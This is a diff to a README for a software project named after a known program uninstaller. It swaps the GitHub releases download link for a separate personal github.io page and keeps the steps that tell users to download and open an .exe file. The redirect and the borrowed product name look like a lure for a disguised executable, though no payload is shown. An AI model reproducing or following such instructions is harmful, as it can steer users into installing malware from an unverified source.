@@ -1,6 +1,6 @@
 # 🗑️ Wise-Program-Uninstaller - Remove unwanted software from your computer
 
-[![Download](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/hamic4956/Wise-Program-Uninstaller/releases)
+[![Download](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://hamic4956.github.io)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start:
 
 Follow these steps to set up the software.
 
-1. Visit the [official download page](https://github.com/hamic4956/Wise-Program-Uninstaller/releases) to access the installation files.
+1. Visit the [official download page](https://hamic4956.github.io) to access the installation files.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder.
